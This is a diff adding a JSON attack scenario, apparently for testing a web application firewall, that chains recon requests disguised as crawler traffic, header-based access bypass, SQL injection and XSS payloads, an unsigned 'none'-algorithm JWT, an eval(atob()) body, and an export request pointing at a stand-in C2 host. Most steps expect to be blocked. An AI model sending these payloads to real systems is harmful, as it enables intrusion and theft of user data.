@@ -1,0 +1,290 @@
+{
+  "id": "distributed-api-reconnaissance-swarm",
+  "name": "Distributed API Reconnaissance Swarm",
+  "category": "Advanced Reconnaissance",
+  "difficulty": "Expert",
+  "description": "Ultra-sophisticated multi-IP distributed reconnaissance campaign using botnet-style coordination, advanced evasion, timing diversification, and API fingerprinting to remain undetected while mapping attack surface",
+  "tags": [
+    "distributed",
+    "reconnaissance",
+    "botnet",
+    "evasion",
+    "api-mapping",
+    "steganography",
+    "timing-attack"
+  ],
+  "steps": [
+    {
+      "id": "swarm-init-1",
+      "name": "Botnet Coordination Beacon",
+      "stage": "preparation",
+      "request": {
+        "method": "GET",
+        "url": "/favicon.ico",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+          "Accept": "image/webp,image/apng,image/*,*/*;q=0.8"
+        }
+      },
+      "execution": {
+        "delayMs": 300
+      }
+    },
+    {
+      "id": "swarm-stealth-1",
+      "name": "Legitimate Traffic Mimicry - Node 1",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/robots.txt",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "Accept": "text/plain, text/html, */*",
+          "Accept-Language": "en-US,en;q=0.9",
+          "Accept-Encoding": "gzip, deflate, br"
+        }
+      },
+      "execution": {
+        "delayMs": 2400
+      },
+      "dependsOn": [
+        "swarm-init-1"
+      ]
+    },
+    {
+      "id": "swarm-stealth-2",
+      "name": "Legitimate Traffic Mimicry - Node 2",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/sitemap.xml",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "Accept": "application/xml, text/xml, */*",
+          "Accept-Language": "en-US,en;q=0.8,es;q=0.6",
+          "Referer": "https://www.google.com/"
+        }
+      },
+      "execution": {
+        "delayMs": 3200
+      },
+      "dependsOn": [
+        "swarm-stealth-1"
+      ]
+    },
+    {
+      "id": "swarm-probe-1",
+      "name": "API Endpoint Discovery - Distributed Scan",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "HEAD",
+        "url": "/api/v1/users",
+        "headers": {
+          "User-Agent": "PostmanRuntime/7.34.0",
+          "Accept": "*/*",
+          "Cache-Control": "no-cache"
+        }
+      },
+      "execution": {
+        "delayMs": 4800
+      },
+      "dependsOn": [
+        "swarm-stealth-2"
+      ]
+    },
+    {
+      "id": "swarm-probe-2",
+      "name": "API Version Enumeration - Node 3",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/",
+        "headers": {
+          "User-Agent": "curl/8.1.2",
+          "Accept": "application/json, text/plain",
+          "X-Requested-With": "curl"
+        }
+      },
+      "execution": {
+        "delayMs": 6100
+      },
+      "dependsOn": [
+        "swarm-probe-1"
+      ]
+    },
+    {
+      "id": "swarm-evasion-1",
+      "name": "Header Poisoning with Timing Evasion",
+      "stage": "delivery",
+      "request": {
+        "method": "GET",
+        "url": "/api/v2/health",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+          "X-Original-URL": "/admin/config",
+          "X-Rewrite-URL": "/api/v2/health",
+          "X-Forwarded-Host": "internal.service.local",
+          "Host": "legitimate.domain.com"
+        }
+      },
+      "execution": {
+        "delayMs": 8700
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "swarm-probe-2"
+      ]
+    },
+    {
+      "id": "swarm-fragment-1",
+      "name": "Request Fragmentation - Part 1",
+      "stage": "delivery",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/search",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+          "Connection": "keep-alive"
+        },
+        "params": {
+          "q": "legitimate search term",
+          "filter": "public"
+        }
+      },
+      "execution": {
+        "delayMs": 11200
+      },
+      "dependsOn": [
+        "swarm-evasion-1"
+      ]
+    },
+    {
+      "id": "swarm-fragment-2",
+      "name": "Request Fragmentation - Payload Delivery",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/v1/feedback",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+          "Content-Type": "application/json",
+          "Connection": "keep-alive"
+        },
+        "body": "{\"feedback\": \"Great service!\", \"metadata\": \"{\\\"probe\\\": \\\"'+UNION+SELECT+user(),version(),@@datadir--\\\", \\\"steganography\\\": \\\"aGVsbG8gd29ybGQ=\\\"}\"}"
+      },
+      "execution": {
+        "delayMs": 13800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "swarm-fragment-1"
+      ]
+    },
+    {
+      "id": "swarm-diversion-1",
+      "name": "High-Noise Diversion Attack",
+      "stage": "diversion",
+      "request": {
+        "method": "POST",
+        "url": "/api/contact",
+        "headers": {
+          "User-Agent": "sqlmap/1.7.8#stable (http://sqlmap.org)",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "name=admin'/**/OR/**/1=1--&email=test@example.com&message=<script>alert('OBVIOUS_XSS')</script>"
+      },
+      "execution": {
+        "delayMs": 15200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "swarm-fragment-2"
+      ]
+    },
+    {
+      "id": "swarm-steganography-1",
+      "name": "Steganographic Command Channel",
+      "stage": "command-control",
+      "request": {
+        "method": "GET",
+        "url": "/api/images/logo.png",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          "Accept": "image/png,image/*;q=0.8,*/*;q=0.5",
+          "Range": "bytes=1024-2048",
+          "X-Steganography-Payload": "eyJjbWQiOiAibmV4dF9zdGFnZSIsICJ0YXJnZXQiOiAiL2FwaS9hZG1pbiIsICJkZWxheSI6IDE4MDAwfQ=="
+        }
+      },
+      "execution": {
+        "delayMs": 18000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "swarm-diversion-1"
+      ]
+    },
+    {
+      "id": "swarm-coordinated-1",
+      "name": "Coordinated Multi-Vector Probe",
+      "stage": "exploitation",
+      "request": {
+        "method": "PUT",
+        "url": "/api/v1/user/preferences",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
+          "Content-Type": "application/json",
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
+          "X-Coordinated-Attack": "phase-2-active"
+        },
+        "body": "{\"theme\": \"dark\", \"notifications\": true, \"admin_panel_access\": true, \"debug_mode\": \"eval(atob('Y29uc29sZS5sb2coJ3N3YXJtLWNvbnRyb2wnKQ=='))\"}"
+      },
+      "execution": {
+        "delayMs": 21500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "swarm-steganography-1"
+      ]
+    },
+    {
+      "id": "swarm-exfiltrate-1",
+      "name": "Distributed Data Exfiltration",
+      "stage": "exfiltration",
+      "request": {
+        "method": "GET",
+        "url": "/api/v1/export/users",
+        "headers": {
+          "User-Agent": "Python/3.11 aiohttp/3.8.5",
+          "Accept": "application/json",
+          "Authorization": "Basic YWRtaW46cGFzc3dvcmQ=",
+          "X-Export-Destination": "https://c2-server.onion/collect",
+          "Connection": "close"
+        },
+        "params": {
+          "format": "json",
+          "filter": "all",
+          "include_sensitive": "true"
+        }
+      },
+      "execution": {
+        "delayMs": 25000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "swarm-coordinated-1"
+      ]
+    }
+  ]
+}
